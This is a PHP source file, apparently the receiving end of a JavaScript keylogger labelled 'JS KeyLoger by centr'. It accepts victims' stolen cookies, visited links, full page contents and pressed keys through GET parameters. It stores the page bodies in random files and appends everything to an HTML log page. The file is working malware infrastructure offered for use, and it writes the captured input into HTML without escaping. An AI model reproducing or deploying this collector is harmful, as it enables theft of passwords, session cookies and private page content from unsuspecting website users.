<?php

$pathBodyPage = "bodyPage";

$fLog = "logPage.html";

if (!file_exists($pathBodyPage)) {
    mkdir($pathBodyPage, 0766, true);
}

if (!file_exists($fLog)) {

  $bdp = '<!DOCTYPE html>
 <html>
  <head>
  <meta charset="UTF-8" />
  <title>The page with the log JSkeyLog</title>
  <style>

  @charset "UTF-8";

  body {
    font-family: "Lucida Sans Unicode", "Lucida Grande", Sans-Serif;
    font-weight: 300;
    line-height: 1.42em;
    color:#7F8289;
    background-color:#2F3238;
  }

  a{
    color:#DE5E60;
    text-decoration: none;
    cursor: pointer;

    -webkit-transition: color 0.1s linear 0s;
       -moz-transition: color 0.1s linear 0s;
       -o-transition: color 0.1s linear 0s;
          transition: color 0.1s linear 0s;
  }

  a:hover,
  a:active,
  a:focus{
    outline: 0;
    color:#FFFFFF;
    text-decoration:none;
  }

  h1 {
    font-size:3em;
    font-weight: 300;
    line-height:1em;
    text-align: center;
    color: #f21010;
  }

  h2 {
    font-size:1em;
    font-weight: 300;
    text-align: center;
    display: block;
    line-height:1em;
    padding-bottom: 2em;
    color: #ededed;
  }


  .rbla { color: #d91569; }

  table th h1 {
      font-weight: bold;
      font-size: 1em;
    text-align: center;
    color: #e3dce0;
  }

  table td {
      font-weight: normal;
      font-size: 1em;
    -webkit-box-shadow: 0 2px 2px -2px #710541;
       -moz-box-shadow: 0 2px 2px -2px #710541;
            box-shadow: 0 2px 2px -2px #710541;
  }

  table {
      text-align: left;
      overflow: hidden;
      width: 80%;
      margin: 0 auto;
    display: table;
    padding: 0 0 8em 0;
     line-height: 1.5em;
  }

  table td, table th {
      padding-bottom: 2%;
      padding-top: 2%;
    padding-left:2%;
  }

  table td {
    padding: 2em ;
  }
  tr :first-child {
    width: 0;
    white-space: nowrap;
  }



  table tr:nth-child(odd) {
      background-color: #3C3F45;
  }

  table tr:nth-child(even) {
      background-color: #2c3038;
  }

  table th {

      background-color: #333539;
  }

  table td:first-child { color: #bababa; }

  table tr:hover {
     background-color: #1c1919;
  -webkit-box-shadow: 0 1.5px 1.5px -1.5px #f60f8e;
       -moz-box-shadow: 0 1.5px 1.5px -1.5px #f60f8e;
            box-shadow: 0 1.5px 1.5px -1.5px #f60f8e;
  }

  table td:hover {
    background-color: #2a2c30;
    color:  #e3dce0;
    font-weight: bold;

    box-shadow: #9c105d -0.5px 0.5px, #aa1768 -1px 1px, #9f085b -1.5px 1.5px;
    transform: translate3d(1.5px, -1.5px, 0);
    transition-delay: 0s;
      transition-duration: 0.4s;
      transition-property: all;
    transition-timing-function: line;
  }

  @media (max-width: 800px) {
  .container td:nth-child(4),
  .container th:nth-child(4) { display: none; }
  }

  footer {
    position: relative;
    width: 100%;
    height: auto;
    background: #26292E;
    text-align: center;
    z-index: 99;
  }

  footer .credits {
    color: #FFFFFF;
    font-size: 13px;
    margin-bottom: 0;
    padding: 20px 0;
    text-transform: uppercase;
  }
  </style>
  </head>
  <body>
  <h1><span class="rbla">&lt;</span>JS Keyloger<span class="rbla">&gt;</span></h1>
  <span><h2>the page with the log</h2></span>

  <table>
  	<thead>
  		<tr>
  			<th><h1>Name</h1></th>
  			<th><h1>Content</h1></th>
  		</tr>
  	</thead>
  	<tbody>
	</tbody>
 </table>
 <footer>
  <p class="credits">&copy;2019 JS KeyLoger by centr. <a href="https://github.com/seoqs" title="centr | Free developer and pentester">Github page</a></p>
 </footer>
  </body>
  </html>';

if ($lgf = fopen($fLog, 'a+')) {

fwrite($lgf, $bdp);

 fclose($lgf);
 }

}


$date = $_GET['date'];
$link = $_GET['link'];
$bodypage = $_GET['bodypage'];
$coockie = $_GET['coockie'];
$key = $_GET['key'];

function addData($addData){

global $fLog;

 $contetnts = file_get_contents($fLog);
$addContetnts =preg_replace('/<\/tbody>/', $addData.'</tbody>', $contetnts);
file_put_contents($fLog, $addContetnts);

}

if (!empty($date)){
 $newData = "<tr>
 <td>Date:</td>
 <td>$date</td>
 </tr>";

if (!empty($link)){
 $newData .= "<tr>
 <td>Link:</td>
 <td><a href='$link'>$link</a></td>
 </tr>";
}
if (!empty($coockie)){
 $newData .= "<tr>
 <td>Coockie:</td>
 <td>$coockie</td>
 </tr>";
}

if (!empty($bodypage)){
 $rand_name=$pathBodyPage."/". chr(rand(65,90)).chr(rand(65,90)).chr(rand(65,90)).chr(rand(65,90)).chr(rand(65,90)).chr(rand(65,90)).chr(rand(65,90)).chr(rand(65,90)).chr(rand(65,90)).".html";

  if ($bodyPageFile = fopen($rand_name, 'a+')) {
    fwrite($bodyPageFile, $bodypage);
    fclose($bodyPageFile);
  }
 $newData .= "<tr>
 <td>Body Page:</td>
 <td><a href='$rand_name' target='_blank' >Open new window</a></td>
 </tr>";
}

addData($newData);
}

if (!empty($key)){
  $klog="<tr>
  <td>Pressed keys:</td>
  <td>
  $key
  </td>
  </tr>";
addData($klog);
}
?>
